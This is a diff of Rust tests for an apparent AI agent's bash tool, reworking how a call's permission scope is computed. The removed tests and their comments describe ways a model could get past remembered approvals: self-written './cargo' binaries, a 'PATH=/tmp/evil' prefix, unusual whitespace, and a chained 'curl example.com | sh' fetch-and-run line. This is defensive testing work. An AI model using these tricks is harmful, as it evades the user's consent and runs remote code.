@@ -3,19 +3,15 @@
 use std::thread;
 use std::time::{Duration, Instant};
 
-use super::output::{OUTPUT, cut};
-use super::{Bash, Cancel, Sensitivity, Tool, ToolArgs, ToolError, ToolOutput, program};
-use crate::sample::{Sample, call, permitted};
+use crucible_core::Command;
 
-/// The sensitivity a granted `bash` call carries.
-fn running(command: &str) -> Sensitivity {
-    Sensitivity::SpawnsProcess {
-        program: program(command).into(),
-    }
-}
+use super::output::{OUTPUT, cut};
+use super::{Bash, Cancel, Sensitivity, Tool, ToolArgs, ToolError, ToolOutput};
+use crate::sample::{Sample, allowed};
 
 fn bash(sample: &Sample, args: &str) -> Result<ToolOutput, ToolError> {
-    Bash::new(sample.workspace(), Cancel::new()).run(call(args), permitted(&running("sh")))
+    let tool = Bash::new(sample.workspace(), Cancel::new());
+    tool.run(allowed(&tool, args))
 }
 
 fn ran(sample: &Sample, args: &str) -> ToolOutput {
@@ -171,11 +167,9 @@ fn a_turn_the_user_stopped_ends_the_command_with_it() {
     });
 
     let started = Instant::now();
-    let problem = Bash::new(sample.workspace(), cancel)
-        .run(
-            call(r#"{"command":"sleep 30"}"#),
-            permitted(&running("sleep")),
-        )
+    let tool = Bash::new(sample.workspace(), cancel);
+    let problem = tool
+        .run(allowed(&tool, r#"{"command":"sleep 30"}"#))
         .expect_err("the turn was stopped");
 
     assert!(matches!(problem, ToolError::Cancelled("bash")));
@@ -191,11 +185,9 @@ fn a_turn_already_stopped_never_starts_the_command() {
     let cancel = Cancel::new();
     cancel.request();
 
-    let problem = Bash::new(sample.workspace(), cancel)
-        .run(
-            call(r#"{"command":"touch should-not-exist"}"#),
-            permitted(&running("touch")),
-        )
+    let tool = Bash::new(sample.workspace(), cancel);
+    let problem = tool
+        .run(allowed(&tool, r#"{"command":"touch should-not-exist"}"#))
         .expect_err("the turn was stopped");
 
     assert!(matches!(problem, ToolError::Cancelled("bash")));
@@ -240,72 +232,16 @@ fn output_that_fits_comes_back_untouched() {
 }
 
 #[test]
-fn the_question_names_the_program_as_the_command_wrote_it() {
-    assert_eq!(program("cargo test"), "cargo");
-    assert_eq!(program("  cargo test  "), "cargo");
-}
-
-#[test]
-fn a_path_is_a_different_program_from_a_bare_name() {
-    // Collapsing these to `cargo` would let one remembered `always` run any
-    // file of that name: the model can write `./cargo` itself and then ask for
-    // it, and a scope that could not tell them apart would not ask again.
-    assert_ne!(program("./cargo test"), program("cargo test"));
-    assert_eq!(program("/usr/bin/cargo test"), "/usr/bin/cargo");
-    assert_eq!(program("./cargo test"), "./cargo");
-}
-
-#[test]
-fn a_leading_assignment_makes_the_whole_command_the_scope() {
-    // The assignment decides which binary the next word resolves to, so that
-    // word alone no longer says what will run.
-    assert_eq!(
-        program("PATH=/tmp/evil cargo test"),
-        "PATH=/tmp/evil cargo test"
-    );
-    assert_eq!(
-        program("  RUST_LOG=debug cargo test  "),
-        "RUST_LOG=debug cargo test"
-    );
-}
-
-#[test]
-fn a_word_the_shell_would_not_split_is_reported_whole() {
-    // `sh` splits on space, tab and newline. Every other whitespace character
-    // is an ordinary character to it and stays part of the word, so naming the
-    // text before one would name a program that is not the one that runs —
-    // `./build` when `./build\u{a0}x` is what the shell resolves and executes.
-    assert_eq!(program("./build\u{a0}x"), "./build\u{a0}x");
-    assert_eq!(program("cargo\u{2028}test"), "cargo\u{2028}test");
-    assert_eq!(program("ls\u{b}rm"), "ls\u{b}rm");
-
-    // A tab is a separator to the shell, so it names a program like a space.
-    assert_eq!(program("cargo\ttest"), "cargo");
-}
-
-#[test]
-fn a_command_that_chains_is_reported_whole() {
-    // Remembering `cargo` from `cargo test` would otherwise also allow
-    // `cargo test; curl example.com | sh` for the rest of the session.
-    assert_eq!(
-        program("cargo test; curl example.com | sh"),
-        "cargo test; curl example.com | sh"
-    );
-    assert_eq!(program("ls > out.txt"), "ls > out.txt");
-    assert_eq!(program("echo $(whoami)"), "echo $(whoami)");
-}
-
-#[test]
-fn the_sensitivity_carries_the_program_the_call_asked_for() {
-    // The path as written, not its last component: what the user is consenting
-    // to is the file that will run, and two files can share a name.
+fn the_sensitivity_carries_what_the_call_will_run() {
     let sample = Sample::new("bash-sensitivity");
     let tool = Bash::new(sample.workspace(), Cancel::new());
 
+    let sensitivity = tool.sensitivity(&ToolArgs::new(r#"{"command":"/usr/bin/git status"}"#));
+
     assert_eq!(
-        tool.sensitivity(&ToolArgs::new(r#"{"command":"/usr/bin/git status"}"#)),
+        sensitivity,
         Sensitivity::SpawnsProcess {
-            program: "/usr/bin/git".into()
+            command: Command::Understood(Box::from([Box::from("/usr/bin/git status")]))
         }
     );
 }
@@ -320,7 +256,7 @@ fn a_call_too_malformed_to_read_reports_the_whole_of_what_was_sent() {
     assert_eq!(
         tool.sensitivity(&ToolArgs::new("not json at all")),
         Sensitivity::SpawnsProcess {
-            program: "not json at all".into()
+            command: Command::Opaque("not json at all".into())
         }
     );
 }
@@ -333,13 +269,10 @@ fn the_variables_the_tool_was_given_reach_the_command() {
     // model's commands get them and nothing else on the machine does.
     let sample = Sample::new("bash-env");
 
-    let output = Bash::new(sample.workspace(), Cancel::new())
-        .exporting([("CRUCIBLE_TEST_PAGER", "cat")])
-        .run(
-            call(r#"{"command":"echo $CRUCIBLE_TEST_PAGER"}"#),
-            permitted(&running("sh")),
-        )
-        .expect("the command ran");
+    let tool =
+        Bash::new(sample.workspace(), Cancel::new()).exporting([("CRUCIBLE_TEST_PAGER", "cat")]);
+    let args = r#"{"command":"echo $CRUCIBLE_TEST_PAGER"}"#;
+    let output = tool.run(allowed(&tool, args)).expect("the command ran");
 
     assert_eq!(output.text(), "cat");
 }
@@ -351,13 +284,10 @@ fn a_variable_the_tool_was_given_wins_over_the_one_crucible_was_started_with() {
     // inheriting the shell's copy instead would leave it doing nothing.
     let sample = Sample::new("bash-env-over");
 
-    let output = Bash::new(sample.workspace(), Cancel::new())
-        .exporting([("HOME", "/nowhere-in-particular")])
-        .run(
-            call(r#"{"command":"echo $HOME"}"#),
-            permitted(&running("sh")),
-        )
-        .expect("the command ran");
+    let tool = Bash::new(sample.workspace(), Cancel::new())
+        .exporting([("HOME", "/nowhere-in-particular")]);
+    let args = r#"{"command":"echo $HOME"}"#;
+    let output = tool.run(allowed(&tool, args)).expect("the command ran");
 
     assert_eq!(output.text(), "/nowhere-in-particular");
 }
